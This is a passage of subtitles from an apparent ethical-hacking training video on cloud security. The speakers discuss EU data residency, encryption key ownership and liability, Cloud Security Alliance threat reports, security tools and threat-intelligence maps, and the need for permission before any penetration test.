dont' have to apply those same\nstandards to the United States citizens.\n\n488\n00:21:46.820 --> 00:21:48.670\nUnless their stored on the same data base,\nand\n\n489\n00:21:48.670 --> 00:21:50.560\nthey're stored under the same conditions.\n\n490\n00:21:50.560 --> 00:21:54.260\nMeaning, if that's a business,\nI segment that user population out,\n\n491\n00:21:54.260 --> 00:21:58.050\nI can actually keep the other systems\nseparate if they never talk to each other,\n\n492\n00:21:58.050 --> 00:22:00.370\nand essentially not apply\nthe same level of protection.\n\n493\n00:22:00.370 --> 00:22:03.810\nI just have to do it to the stuff that's\nrelated to the European Union, so\n\n494\n00:22:03.810 --> 00:22:06.300\nmaking sure we're doing this\nkind of stuff is important.\n\n495\n00:22:06.300 --> 00:22:09.550\nFocusing on authentication,\nauthorization, and access.\n\n496\n00:22:09.550 --> 00:22:13.450\nThe triple A that we talk about with IAM,\nwith Identity and Access Management.\n\n497\n00:22:13.450 --> 00:22:16.170\nLooking at SLA's we've talked\nabout this in the U sub.\n\n498\n00:22:16.170 --> 00:22:19.290\nSLA's is contractual vehicles\nto manage up time and\n\n499\n00:22:19.290 --> 00:22:22.450\nto manage the expectation\nof the relationship.\n\n500\n00:22:22.450 --> 00:22:26.140\nTo provide service and to talk about what\nhappens when we are not providing service\n\n501\n00:22:26.140 --> 00:22:28.030\nis important for us to think about.\n\n502\n00:22:28.030 --> 00:22:30.960\nThinking about verification and\n\n503\n00:22:30.960 --> 00:22:35.530\nvalidation from the perspective of\n[INAUDIBLE] under things like the sock\n\n504\n00:22:35.530 --> 00:22:39.580\nreporting standards that I've mentioned,\nISO alignment, some of that kind of stuff.\n\n505\n00:22:39.580 --> 00:22:43.630\nKey generation for encryption, is it,\nlet's play a little game for a second.\n\n506\n00:22:43.630 --> 00:22:48.330\nSo is it from your perspective if you were\nhaving to think about this as a cloud\n\n507\n00:22:48.330 --> 00:22:53.620\ncustomer and a cloud vendor,\ndoes the cloud vendor want to control and\n\n508\n00:22:53.620 --> 00:22:57.740\nhave knowledge of and indeed have\noversight of the encryption keys the cloud\n\n509\n00:22:57.740 --> 00:22:58.970\ncustomers use to encrypt data?\n\n510\n00:22:58.970 --> 00:22:59.530\nWhat do you think?\n\n511\n00:22:59.530 --> 00:23:01.980\n>> If I was that cloud vendor,\nI would say absolutely not.\n\n512\n00:23:01.980 --> 00:23:03.560\n>> And you'd be absolutely right.\n\n513\n00:23:03.560 --> 00:23:04.160\nGreat so.\n>> [LAUGH].\n\n514\n00:23:04.160 --> 00:23:08.450\n>> You know the problem that we see today,\nor at least I won't call it a problem, but\n\n515\n00:23:08.450 --> 00:23:12.310\nfrom the perspective of the cloud vendor\n>> The problem they see\n\n516\n00:23:12.310 --> 00:23:16.270\nis that if they are holding the keys,\nthey're liable when there's a breach.\n\n517\n00:23:16.270 --> 00:23:19.840\nIf they give the keys to you as\nthe cloud customer, they can say,\n\n518\n00:23:19.840 --> 00:23:22.890\nthat's horrible, but\nthe breach wasn't on our system,\n\n519\n00:23:22.890 --> 00:23:26.430\nit was because of a direct result\nof the key being compromised.\n\n520\n00:23:26.430 --> 00:23:29.310\nWe had no knowledge of the fact\nthat wasn't an authorized user.\n\n521\n00:23:29.310 --> 00:23:32.600\nYou know, they had the key,\nas far as we knew, they were legitimate.\n\n522\n00:23:32.600 --> 00:23:33.800\nOur systems were secure.\n\n523\n00:23:33.800 --> 00:23:35.900\nIn other words,\nit was your lack of key management,\n\n524\n00:23:35.900 --> 00:23:37.840\nMr customer, that lead to the compromise.\n\n525\n00:23:37.840 --> 00:23:41.190\n>> Is there any concern\nas well as if there was a\n\n526\n00:23:41.190 --> 00:23:41.770\n>> A warrant or\n\n527\n00:23:41.770 --> 00:23:45.460\nsomething like that coming in and\nsaying, hey we need that data.\n\n528\n00:23:45.460 --> 00:23:48.620\nIf as the vendor, I don't have the keys.\n\n529\n00:23:48.620 --> 00:23:52.059\n>> Or at least it would be\na lot harder for you to comply.\n\n530\n00:23:52.059 --> 00:23:53.680\nThey're smart about this.\n\n531\n00:23:53.680 --> 00:23:54.767\nThey understand.\n\n532\n00:23:54.767 --> 00:23:58.337\nA search and discovery order a cease and\ndesist or discovery order.\n\n533\n00:23:58.337 --> 00:24:02.483\nThat served, that the vendor says, hey,\nno problem, it's all sitting right there,\n\n534\n00:24:02.483 --> 00:24:03.600\nit's encrypted.\n\n535\n00:24:03.600 --> 00:24:07.030\nYou can make a copy of it but I don't have\nthe keys and can't tell you what's there.\n\n536\n00:24:08.470 --> 00:24:11.463\nIn theory the government or whoever\nthe entity that has the order can come and\n\n537\n00:24:11.463 --> 00:24:14.616\nseize the data, but without the keys,\nthey're not gonna be able to unlock it.\n\n538\n00:24:14.616 --> 00:24:17.925\nAnd we talked about the possibilities\nthat they can anyway, right.\n\n539\n00:24:17.925 --> 00:24:19.916\nI mean I'm not suggesting\nthat they will or won't,\n\n540\n00:24:19.916 --> 00:24:22.768\nI'm just pointing out that the cloud\nvendor, and Mike raises an excellent\n\n541\n00:24:22.768 --> 00:24:26.030\npoint here, cannot be compelled to give\nup stuff they don't possess, right?\n\n542\n00:24:26.030 --> 00:24:28.700\nSo the reality is they just can't\ntell you what the keys are.\n\n543\n00:24:28.700 --> 00:24:31.380\nAnd this is why cloud vendors more and\nmore are pushing back on customers,\n\n544\n00:24:31.380 --> 00:24:34.370\nsaying hey, we're gonna give you\nthe means to encrypt, right?\n\n545\n00:24:34.370 --> 00:24:36.030\nWe're gonna give you the opportunity.\n\n546\n00:24:36.030 --> 00:24:38.420\nYou generate those keys, they're gone,\nwe don't want to see them.\n\n547\n00:24:38.420 --> 00:24:40.710\nYou hold them and\nyou decide what you're gonna do with them.\n\n548\n00:24:40.710 --> 00:24:43.143\nAnd when you're done with the data,\nyou exit out platform,\n\n549\n00:24:43.143 --> 00:24:44.489\nwe're gonna get rid of the data.\n\n550\n00:24:44.489 --> 00:24:47.440\nIt's encrypted, we don't have the keys,\nwe don't know anything about it.\n\n551\n00:24:47.440 --> 00:24:48.670\nIt's gone, we don't know.\n\n552\n00:24:48.670 --> 00:24:52.652\nSo they're doing this on purpose because\nthey don't want the liability, both from\n\n553\n00:24:52.652 --> 00:24:56.426\nthe breach perspective, right, as well\nas from the compliance perspective.\n\n554\n00:24:56.426 --> 00:24:59.510\nCuz they can't be forced to give\nup stuff that they don't own.\n\n555\n00:24:59.510 --> 00:25:01.623\nAnd so this, for them, is a mitigation and\n\n556\n00:25:01.623 --> 00:25:05.343\ncompensation control to deal with\nthe liabilities associated with this.\n\n557\n00:25:05.343 --> 00:25:05.931\n>> Interesting.\n>> So,\n\n558\n00:25:05.931 --> 00:25:07.055\nit is something to think about, right?\n\n559\n00:25:07.055 --> 00:25:08.121\n>> Mm-hm.\n\n560\n00:25:08.121 --> 00:25:09.223\n>> Something to consider.\n\n561\n00:25:09.223 --> 00:25:11.300\nSo you really have to\nbe aware of this stuff.\n\n562\n00:25:11.300 --> 00:25:14.130\nYou have to be aware of the jurisdictional\nlaws within the geographies you\n\n563\n00:25:14.130 --> 00:25:16.450\nare operating in as\na certified ethical hacker,\n\n564\n00:25:16.450 --> 00:25:18.070\nas a security professional in general.\n\n565\n00:25:18.070 --> 00:25:19.940\nBut especially as an ethical hacker,\n\n566\n00:25:19.940 --> 00:25:22.810\nyou have to understand that different\ncountries have different laws.\n\n567\n00:25:22.810 --> 00:25:26.700\nThe rights to privacy in the EU are much\nmore stringent than they are anywhere in\n\n568\n00:25:26.700 --> 00:25:27.790\nthe world right now.\n\n569\n00:25:27.790 --> 00:25:30.250\nAnd as a result of that,\nif you do business there,\n\n570\n00:25:30.250 --> 00:25:32.800\nyou can operate under a very\ndifferent set of assumptions and\n\n571\n00:25:32.800 --> 00:25:36.430\nconstraints than you do as a security\nprofessional in the United States or\n\n572\n00:25:36.430 --> 00:25:42.590\nin Canada or in Mexico, or in Japan,\nor anywhere else other than the EU.\n\n573\n00:25:42.590 --> 00:25:45.997\nAnd so you have to think about\nthose things as well and\n\n574\n00:25:45.997 --> 00:25:50.723\nunderstand that there's a lot of need\nto be very geographic specific and\n\n575\n00:25:50.723 --> 00:25:56.387\ngeographic aware, I call it geo-awareness,\nwith regards to cloud security today.\n\n576\n00:25:56.387 --> 00:26:00.214\nBecause hacking through the cloud\nis hacking across geographic and\n\n577\n00:26:00.214 --> 00:26:02.220\njurisdictional boundaries.\n\n578\n00:26:02.220 --> 00:26:03.640\nAnd that's something you\nhave to think about.\n\n579\n00:26:03.640 --> 00:26:06.970\nBecause as security professionals\nwe don't often stop and\n\n580\n00:26:06.970 --> 00:26:09.470\nthink about where the data is if\nwe're doing that kind of work.\n\n581\n00:26:09.470 --> 00:26:13.217\nBut hackers do, and hackers know where\nthat data is that they have to target.\n\n582\n00:26:13.217 --> 00:26:16.705\nBecause they're taking all those steps\nwe talked about to footprint, to recon,\n\n583\n00:26:16.705 --> 00:26:17.540\nto enumerate.\n\n584\n00:26:17.540 --> 00:26:20.180\nThey know where that stuff is\nbefore they come get it, right?\n\n585\n00:26:20.180 --> 00:26:23.990\nSo they're aware of that, and you have\nto think about that as a CEH as well.\n\n586\n00:26:23.990 --> 00:26:28.050\nBecause you may very well be violating and\nbreaking a law in a country\n\n587\n00:26:28.050 --> 00:26:31.222\nwhen you are doing a pen test across\na geographic boundary through the cloud.\n\n588\n00:26:31.222 --> 00:26:32.874\n>> Hm.\n>> And you may not have been aware of\n\n589\n00:26:32.874 --> 00:26:35.388\nthat, but that, excuse me,\ncould easily happen.\n\n590\n00:26:35.388 --> 00:26:38.690\nAnd that's something you have to think\nabout and really be aware of, right?\n\n591\n00:26:38.690 --> 00:26:41.560\nWe've talked about NIST\nrecommendations for cloud security.\n\n592\n00:26:41.560 --> 00:26:44.327\nWe've talked about, certainly,\nthe guidance that NIST provides and\n\n593\n00:26:44.327 --> 00:26:46.970\ntalked about the fact that a lot of\nthe stuff out there is important.\n\n594\n00:26:46.970 --> 00:26:51.204\nAlong with all of the recommendations\nwe've talked about in various areas that\n\n595\n00:26:51.204 --> 00:26:54.694\nnot just NIST but ISO that\nthe Cloud Security Alliance provides.\n\n596\n00:26:54.694 --> 00:26:58.990\nPCI DSS guidance with regards to\npayment transaction processing.\n\n597\n00:26:58.990 --> 00:26:59.680\nProbably a good time for\n\n598\n00:26:59.680 --> 00:27:03.320\nus to take a quick look at something\nspecific from Cloud Security Alliance.\n\n599\n00:27:03.320 --> 00:27:06.060\nReally would not be able to have\na complete conversation about cloud and\n\n600\n00:27:06.060 --> 00:27:08.200\ncloud security without\ntalking about the CSA.\n\n601\n00:27:08.200 --> 00:27:11.890\nWe've talked about them in some different\nepisodes earlier in the discussions here.\n\n602\n00:27:11.890 --> 00:27:15.920\nBut on Mike's machine we have\na website we wanna quickly show for\n\n603\n00:27:15.920 --> 00:27:17.990\nthe Cloud Security Alliance,\nspecifically for\n\n604\n00:27:17.990 --> 00:27:20.050\nthe Top Threats Working Group\nthat they have.\n\n605\n00:27:21.150 --> 00:27:24.360\nInteresting group, it's made up of\nsome really, really smart people,\n\n606\n00:27:24.360 --> 00:27:26.430\nvery knowledgeable about\nstuff in the cloud.\n\n607\n00:27:26.430 --> 00:27:30.440\nThey put out a series of white papers, and\nwe're gonna show you how to find them here\n\n608\n00:27:30.440 --> 00:27:34.860\nin a second, that talk about the most\nrecent threats or concerns in the cloud.\n\n609\n00:27:34.860 --> 00:27:37.690\nThey put up one a few years\nback called the Notorious Nine,\n\n610\n00:27:37.690 --> 00:27:40.070\nmost recent one is the Top Twelve.\n\n611\n00:27:40.070 --> 00:27:44.031\nSo these are threats that are inherent in\nthe cloud, threats that, as bad actors,\n\n612\n00:27:44.031 --> 00:27:45.794\nwe are propagating and exploiting.\n\n613\n00:27:45.794 --> 00:27:48.357\nThreats that, as certified ethical\nhackers, we wanna be aware so\n\n614\n00:27:48.357 --> 00:27:49.720\nwe could defend against.\n\n615\n00:27:49.720 --> 00:27:52.450\nCan we click on that Downloads\nlink right up there?\n\n616\n00:27:52.450 --> 00:27:54.390\nWhen you do that,\nyou'll see the Treacherous Twelve,\n\n617\n00:27:54.390 --> 00:27:57.030\nwhich is the new report\nthey put out in early 2016.\n\n618\n00:27:57.030 --> 00:28:01.900\nThere's a link to it there, the Notorious\nNine was from three years back.\n\n619\n00:28:01.900 --> 00:28:04.313\nKind of following that same\nthree year cycle that 's does,\n\n620\n00:28:04.313 --> 00:28:05.820\nright, with regards to that.\n\n621\n00:28:05.820 --> 00:28:07.862\nSo it would be very important for\nyou to be aware of these.\n\n622\n00:28:07.862 --> 00:28:10.717\nAnd i's a good idea, again,\nwe think about building those.\n\n623\n00:28:10.717 --> 00:28:12.252\nThat's okay, you just clicked\non the Download link, right?\n\n624\n00:28:12.252 --> 00:28:14.503\n>> Mm-hm.\n>> We think about building that toolkit as\n\n625\n00:28:14.503 --> 00:28:18.128\nwe've often talked about, and not all\ntools are tools that you'd use to be able\n\n626\n00:28:18.128 --> 00:28:20.250\nto accomplish some sort of outcome.\n\n627\n00:28:20.250 --> 00:28:22.900\nSome of the tools are simply\nknowledge that you acquire, and\n\n628\n00:28:22.900 --> 00:28:24.370\nthat you can refer to.\n\n629\n00:28:24.370 --> 00:28:26.430\nAnd this is a great example\nof that kind of a tool.\n\n630\n00:28:26.430 --> 00:28:29.846\nYou download the Treacherous Twelve\nreport and read through it,\n\n631\n00:28:29.846 --> 00:28:34.006\nyou're gonna be given a roadmap for\nthe 12 highlighted vulnerabilities that\n\n632\n00:28:34.006 --> 00:28:38.558\nare facing web-related and cloud-related\nservice providers and customers today.\n\n633\n00:28:38.558 --> 00:28:41.310\nAnd that you should be, as an ethical\nhacker, aware of and defending against.\n\n634\n00:28:41.310 --> 00:28:44.860\nSo it's a great way for us to get\nknowledgeable about some of these things.\n\n635\n00:28:44.860 --> 00:28:47.420\nAnd so just maybe valuable for\nyou to take a look at, right?\n\n636\n00:28:47.420 --> 00:28:49.510\nWe talked about maybe\ngiving you some tools and\n\n637\n00:28:49.510 --> 00:28:52.130\ntalk a little bit about tools that\ncan help us to do this kinda stuff.\n\n638\n00:28:52.130 --> 00:28:53.820\nThere's a lot of different\ntools out there.\n\n639\n00:28:53.820 --> 00:28:56.884\nA lot of them, believe it or not, are\ncloud-based, shocking though that may be.\n\n640\n00:28:56.884 --> 00:28:58.672\n>> [LAUGH]\n>> And so\n\n641\n00:28:58.672 --> 00:29:02.790\na lot of them are gonna be cloud\nplatforms that we could take a look at.\n\n642\n00:29:02.790 --> 00:29:06.120\nWe may want to go in and\nlook at something like CloudPassage Halo.\n\n643\n00:29:06.120 --> 00:29:10.480\nWhich is a cloud server security platform,\nlets you go in and take a look at and\n\n644\n00:29:10.480 --> 00:29:11.920\nmonitor infrastructure.\n\n645\n00:29:11.920 --> 00:29:15.012\nSo this is one of\nthe tools that's out there.\n\n646\n00:29:15.012 --> 00:29:20.210\nThere is, a whole bunch, let me think.\n\n647\n00:29:20.210 --> 00:29:23.680\nSo Symantec has a cloud platform,\n\n648\n00:29:23.680 --> 00:29:27.260\nI think it's called O3, but\nthey change names all the time.\n\n649\n00:29:27.260 --> 00:29:29.067\nDell has one called Cloud Manager.\n\n650\n00:29:29.067 --> 00:29:32.202\nThere's Nessus, which we've\ntalked about in prior episodes.\n\n651\n00:29:32.202 --> 00:29:34.878\nThat used to be a tool that\nyou would run locally.\n\n652\n00:29:34.878 --> 00:29:38.751\nBut then Tenable bought them up, so\nnow it's available through the cloud.\n\n653\n00:29:38.751 --> 00:29:42.270\nWe've actually, I think, demoed that\nin some of our prior discussions.\n\n654\n00:29:42.270 --> 00:29:44.570\nThere's, what else?\n\n655\n00:29:44.570 --> 00:29:50.234\nThere's PortaCore, Qualsys has one,\nthe cloud security suite that they have.\n\n656\n00:29:50.234 --> 00:29:53.546\nThere's just a whole bunch out there that\nyou can use and you can think about.\n\n657\n00:29:53.546 --> 00:29:57.240\nAny or all of them are gonna be valuable\nof course, but the reality is that you\n\n658\n00:29:57.240 --> 00:30:00.496\nhave to find, and we had this\nconversation with soffice, right.\n\n659\n00:30:00.496 --> 00:30:03.370\nWe were talking about different cloud\nvendors or cloud AV vendors and\n\n660\n00:30:03.370 --> 00:30:04.270\nwhat we like.\n\n661\n00:30:04.270 --> 00:30:07.970\nYou've gotta find a vendor and\na tool set that makes sense for you.\n\n662\n00:30:07.970 --> 00:30:10.558\nWhat you really need to do is go\ntake a look at their functionality,\n\n663\n00:30:10.558 --> 00:30:12.326\nyou've gotta take a look\nat what they offer.\n\n664\n00:30:12.326 --> 00:30:15.660\nYou've gotta test drive them, right, and\nfigure out what's gonna happen out there.\n\n665\n00:30:15.660 --> 00:30:19.200\nAnd one of the ways to figure out what the\nbest platform may be is to get a sense of\n\n666\n00:30:19.200 --> 00:30:21.730\nthe kinds of issues and\nconcerns you may be facing.\n\n667\n00:30:21.730 --> 00:30:24.840\nCould we bring up one of those maps\nyou had up earlier, the heat maps?\n\n668\n00:30:24.840 --> 00:30:27.555\nI don't care, the Norse one was cool,\nI guess, the one Ben gave us cuz, or\n\n669\n00:30:27.555 --> 00:30:28.734\nLewis gave us that one, right?\n\n670\n00:30:28.734 --> 00:30:29.390\n>> Lewis gave us that one.\n\n671\n00:30:29.390 --> 00:30:30.120\n>> Not Ben.\n\n672\n00:30:30.120 --> 00:30:33.987\nBecause that was the one that had the\nlittle, the pew pew pew, shooting back and\n\n673\n00:30:33.987 --> 00:30:35.710\nforth graphics, right?\n\n674\n00:30:35.710 --> 00:30:38.040\nBut whether it's this kind of a map,\nright, or\n\n675\n00:30:38.040 --> 00:30:40.450\nit's the other one that\nyou had up as well.\n\n676\n00:30:40.450 --> 00:30:44.873\nWhichever one it is, you're looking at one\nof these heat maps to see what's happening\n\n677\n00:30:44.873 --> 00:30:46.093\nin the world right now.\n\n678\n00:30:46.093 --> 00:30:49.507\nIt's gonna be a good place to start for\nyou with regards to cloud security.\n\n679\n00:30:49.507 --> 00:30:51.998\nBecause you're gonna get\na sense of the top exploits and\n\n680\n00:30:51.998 --> 00:30:54.490\nvulnerabilities that are taking place,\nright?\n\n681\n00:30:54.490 --> 00:30:58.097\nLooks like Asia is just kicking\nAfrica's ass right now.\n\n682\n00:30:58.097 --> 00:30:59.777\n>> [LAUGH]\n>> It's almost like watching the COPA Cup.\n\n683\n00:30:59.777 --> 00:31:00.666\n>> It is.\n\n684\n00:31:00.666 --> 00:31:04.946\n>> Watching soccer happen in real-time\nthey're just pounding on them.\n\n685\n00:31:04.946 --> 00:31:06.679\nThere's all this stuff\ncoming out of Japan and\n\n686\n00:31:06.679 --> 00:31:08.590\nChina right now it looks like on the map,\nright.\n\n687\n00:31:08.590 --> 00:31:12.170\n>> And I see some from Microsoft back to\nChina and China to Microsoft, interesting.\n\n688\n00:31:12.170 --> 00:31:15.760\n>> Awesome, cool, so that means there's\nsome good stuff going on in the west coast\n\n689\n00:31:15.760 --> 00:31:17.310\nthere back and forth, right?\n\n690\n00:31:17.310 --> 00:31:22.000\nSo, aside from the obvious war game\nreferences which we won't go into here\n\n691\n00:31:22.000 --> 00:31:22.710\nwith the graphic.\n\n692\n00:31:22.710 --> 00:31:26.800\nBut the reality is maps like this,\nheat maps like this are very valuable and\n\n693\n00:31:26.800 --> 00:31:28.180\nthey offer real-time intelligence.\n\n694\n00:31:28.180 --> 00:31:31.700\nOne of the important things to consider is\nthe use of real-time threat intelligence\n\n695\n00:31:31.700 --> 00:31:35.100\nwhen you're thinking about dealing\nwith cloud-related security concerns.\n\n696\n00:31:35.100 --> 00:31:37.640\nBecause there's really no better way today\n\n697\n00:31:37.640 --> 00:31:41.150\nto understand what the problems are gonna\nbe that your gonna have to defend against\n\n698\n00:31:41.150 --> 00:31:44.520\nthan understanding what's happening\nin hot spots around the world.\n\n699\n00:31:44.520 --> 00:31:46.580\nYou may not get hit\nwith those exploits but\n\n700\n00:31:46.580 --> 00:31:49.490\nknowing that they're on the rise in Asia,\nin Africa, in Latin America,\n\n701\n00:31:49.490 --> 00:31:51.760\nwherever, can at least\nhelp you to prepare.\n\n702\n00:31:51.760 --> 00:31:54.580\nHey, I've never heard of this\nthing called CryptoLocker before.\n\n703\n00:31:54.580 --> 00:31:56.403\nWhat is it?\nHow do I defend against it if I get\n\n704\n00:31:56.403 --> 00:31:57.053\nhit with it?\n\n705\n00:31:57.053 --> 00:31:59.099\nAnd it may be good for\nyou to go out and take a look, right?\n\n706\n00:31:59.099 --> 00:32:01.734\nSo it's valuable for\nyou to find these platforms.\n\n707\n00:32:01.734 --> 00:32:02.701\nThere are a lot out there.\n\n708\n00:32:02.701 --> 00:32:05.004\nSome of them you have to pay for,\nquite a few of them you do.\n\n709\n00:32:05.004 --> 00:32:07.843\nSome of them are free, you can look\nat just the general heat maps and\n\n710\n00:32:07.843 --> 00:32:09.600\nget an idea of what's happening.\n\n711\n00:32:09.600 --> 00:32:12.420\nBut subscribing to thread\nIntelligence Systems today\n\n712\n00:32:12.420 --> 00:32:16.910\nis gonna give you a tremendous valuable\nleg up around this kind of information and\n\n713\n00:32:16.910 --> 00:32:19.470\nthe acquisition of it,\nnot just in the cloud, but in general.\n\n714\n00:32:19.470 --> 00:32:21.450\nRegards to anything we're\ngonna do in security.\n\n715\n00:32:21.450 --> 00:32:23.250\nSo you wanna be thinking about that.\n\n716\n00:32:23.250 --> 00:32:28.190\nWhen we think about the use of this kind\nof information to drive pen testing and\n\n717\n00:32:28.190 --> 00:32:30.400\nvalidation of our concerns\naround the cloud.\n\n718\n00:32:30.400 --> 00:32:32.530\nAs we do in every topic we've discussed,\nright?\n\n719\n00:32:32.530 --> 00:32:35.720\nWe have to think about the fact that\nwe have to take this knowledge and\n\n720\n00:32:35.720 --> 00:32:38.690\nprobe the boundaries and\nthe limitations of what the solution is.\n\n721\n00:32:38.690 --> 00:32:41.160\nAnd that's really what pen testing is,\nregardless of platform.\n\n722\n00:32:41.160 --> 00:32:43.637\nIt's validating the assumptions\nwe've uncovered, and\n\n723\n00:32:43.637 --> 00:32:46.833\nformed through foot-printing,\nthrough recon, through enumeration.\n\n724\n00:32:46.833 --> 00:32:51.715\nSo that way we can understand whether we\ncan actually exploit those vulnerabilities\n\n725\n00:32:51.715 --> 00:32:54.270\nof weaknesses, or rather if not, why not?\n\n726\n00:32:54.270 --> 00:32:57.450\nSo that we know that we're doing the right\nthing and that we can double down on that.\n\n727\n00:32:57.450 --> 00:32:59.380\nAnd defend heavier in those areas.\n\n728\n00:32:59.380 --> 00:33:02.230\nBut then patch the areas where\nwe're not making good progress.\n\n729\n00:33:02.230 --> 00:33:04.130\nAnd we do have vulnerabilities and\nconcerns.\n\n730\n00:33:04.130 --> 00:33:05.160\nSo we have to think about that.\n\n731\n00:33:05.160 --> 00:33:07.590\nWe really have to be able to go ahead and\ndo the scanning and\n\n732\n00:33:07.590 --> 00:33:08.720\nvulnerability assessments.\n\n733\n00:33:08.720 --> 00:33:10.180\nThe reconning, the foot printing.\n\n734\n00:33:10.180 --> 00:33:11.230\nBut keep in mind,\n\n735\n00:33:11.230 --> 00:33:15.180\ncloud vendors are actively pursuing\nsecurity solutions on their platform.\n\n736\n00:33:15.180 --> 00:33:18.130\nYou may very well wind up\ngetting into a lot of trouble\n\n737\n00:33:18.130 --> 00:33:20.840\nby actually trying to this\nwork on the platform.\n\n738\n00:33:20.840 --> 00:33:22.320\nAnd you have to take that into account.\n\n739\n00:33:22.320 --> 00:33:26.290\nBecause it may be very tough for you to\nsuccessfully pin test your own systems\n\n740\n00:33:26.290 --> 00:33:28.690\nbecause you're not managing them,\nsomebody else is.\n\n741\n00:33:28.690 --> 00:33:30.950\nAnd you have to think about that as well,\nand that's a potential issue and\n\n742\n00:33:30.950 --> 00:33:32.070\na concern for us, right?\n\n743\n00:33:32.070 --> 00:33:33.620\nWe have to think about it and\nsee how to deal with that.\n\n744\n00:33:33.620 --> 00:33:37.021\nAs I said, without exception, without\nfailure, what's the number one rule,\n\n745\n00:33:37.021 --> 00:33:38.482\nthe very first thing we always do?\n\n746\n00:33:38.482 --> 00:33:39.832\n>> We gotta have permission.\n\n747\n00:33:39.832 --> 00:33:41.098\n>> No, figure out who to\nblame when things go wrong.\n\n748\n00:33:41.098 --> 00:33:42.842\n>> [LAUGH]\n>> Then, number two,\n\n749\n00:33:42.842 --> 00:33:44.407\nis always get a permission.\n\n750\n00:33:44.407 --> 00:33:46.316\nSo yes, you must first inform us, right?\n\n751\n00:33:46.316 --> 00:33:49.870\nMust first inform us, have permission\nfrom senior management and or\n\n752\n00:33:49.870 --> 00:33:53.070\nfrom the customer, whoever it is,\nto engage in those activities.\n\n753\n00:33:53.070 --> 00:33:56.250\nAnd by extension, we then do figure out\nwho to blame when things go wrong cuz we\n\n754\n00:33:56.250 --> 00:33:59.250\ndon't have that, then we know that we\nshould not be doing it in the first place,\n\n755\n00:33:59.250 --> 00:34:00.930\nit's our fault, all kidding aside.\n\n756\n00:34:00.930 --> 00:34:03.900\nIf we engaged in those activities,\nand we did not have permission.\n\n757\n00:34:03.900 --> 00:34:08.740\nThe worst thing you could do as a\ncertified ethical hacker, as a pen tester,\n\n758\n00:34:08.740 --> 00:34:11.950\nas a security professional, is overstep\nthe boundary of what the customer feels\n\n759\n00:34:11.950 --> 00:34:14.660\ncomfortable with you doing,\nin order to prove a point.\n\n760\n00:34:14.660 --> 00:34:15.570\nYou're not winning.\n\n761\n00:34:15.570 --> 00:34:16.390\nYou're not doing anything.\n\n762\n00:34:16.390 --> 00:34:20.570\nAll you're doing is proving that you're\nnot able to operate securely and\n\n763\n00:34:20.570 --> 00:34:22.640\nshould not be trusted\nin their environment.\n\n764\n00:34:22.640 --> 00:34:26.280\nIn the eyes of the customer, you're as bad\nas a bad actor and a hacker at that point.\n\n765\n00:34:26.280 --> 00:34:27.410\nYou've crossed the line.\n\n766\n00:34:27.410 --> 00:34:29.920\nAnd you have done things they've\ntold you explicitly they're not\n\n767\n00:34:29.920 --> 00:34:31.420\ncomfortable with you doing.\n\n768\n00:34:31.420 --> 00:34:34.880\nSo I want you to be clear about\nthe fact that you must always operate\n\n769\n00:34:34.880 --> 00:34:39.440\nwith full disclosure as a security\nprofessional, as an ethical hacker,\n\n770\n00:34:39.440 --> 00:34:42.430\nyou must always tell the customer\nwhat it is you're planning on doing.\n\n771\n00:34:42.430 --> 00:34:43.790\nNow this raises an exception.\n\n772\n00:34:43.790 --> 00:34:47.000\nBefore I let Mike comment on whatever he\nwants to comment on cuz I know he's got\n\n773\n00:34:47.000 --> 00:34:48.415\nsomething important he wants to say.\n\n774\n00:34:48.415 --> 00:34:49.940\n>> [LAUGH]\n>> Clearly, right?\n\n775\n00:34:49.940 --> 00:34:52.180\nIf you're doing a pen test\nthere are different levels,\n\n776\n00:34:52.180 --> 00:34:53.410\ndifferent kinds of testing.\n\n777\n00:34:53.410 --> 00:34:55.020\nBlack box, white box, gray box.\n\n778\n00:34:55.020 --> 00:34:56.250\nWe talked about this, right?\n\n779\n00:34:56.250 --> 00:34:59.230\nZero knowledge, partial knowledge,\nfull knowledge.\n\n780\n00:34:59.230 --> 00:35:03.588\nThe idea is that if you're engaging\nin a black box test, zero knowledge.\n\n781\n00:35:03.588 --> 00:35:06.449\nEven then, and I made this clear when\nwe talked about this in prior episodes,\n\n782\n00:35:06.449 --> 00:35:08.537\nwhen we were talking about\nhacking the system, right?\n\n783\n00:35:08.537 --> 00:35:12.520\nEven then you're gonna have to seek\npermission from the customer to engage in\n\n784\n00:35:12.520 --> 00:35:14.710\nthat activity prior to starting.\n\n785\n00:35:14.710 --> 00:35:18.150\nIn other words, you have to sit down\nwith the senior level leadership\n\n786\n00:35:18.150 --> 00:35:20.205\nthey have to sign off on\nthe fact they want this done.\n\n787\n00:35:20.205 --> 00:35:24.220\nHow you do it, when you do it,\nwhat you're gonna do,\n\n788\n00:35:24.220 --> 00:35:27.620\nhow you're gonna come at them,\nwhat you're gonna take on,\n\n789\n00:35:27.620 --> 00:35:30.560\nthose are things that they may not\nwanna know about ahead of time.\n\n790\n00:35:30.560 --> 00:35:33.130\nThey may say, look, we're just gonna say,\nin the next two weeks,\n\n791\n00:35:33.130 --> 00:35:35.090\nwe expect you to engage in this activity.\n\n792\n00:35:35.090 --> 00:35:36.960\nThis part of the network\nis clearly off-limits.\n\n793\n00:35:36.960 --> 00:35:39.080\nIf you see anything like this,\njust ignore it.\n\n794\n00:35:39.080 --> 00:35:41.490\nBut other than that,\nyou're free to do what you want.\n\n795\n00:35:41.490 --> 00:35:44.230\nTwo weeks from now, sit back in that\nchair and tell us what you find.\n\n796\n00:35:44.230 --> 00:35:47.860\nSign that piece of paper Mr. Customer that\nsays I've got the right to do this and\n\n797\n00:35:47.860 --> 00:35:50.370\nyou're giving me two weeks to,\nand I'll be happy to.\n\n798\n00:35:50.370 --> 00:35:53.210\nBut even then you've still\ngot permission up front.\n\n799\n00:35:53.210 --> 00:35:55.450\nIf you're not getting permission,\nlet me be clear,\n\n800\n00:35:55.450 --> 00:35:57.650\nyou are not ethically hacking,\nyou are hacking.\n\n801\n00:35:57.650 --> 00:35:59.130\nYou are acting as a bad actor.\n\n802\n00:35:59.130 --> 00:36:02.214\nEven with the best of intentions\nthat is still unacceptable and\n\n803\n00:36:02.214 --> 00:36:05.132\nis not appropriate under any\ncircumstance for any reason.\n\n804\n00:36:05.132 --> 00:36:08.264\n>> Now to cut along those same lines,\nand I don't know if we have an answer\n\n805\n00:36:08.264 --> 00:36:12.130\nbecause we probably need more specifics\nand contract details and things like that.\n\n806\n00:36:12.130 --> 00:36:16.140\nBut when you look and say infrastructure\nis a service versus platform versus\n\n807\n00:36:16.140 --> 00:36:21.960\nsoftware, if I've got a company\nthat's doing software as a service.\n\n808\n00:36:21.960 --> 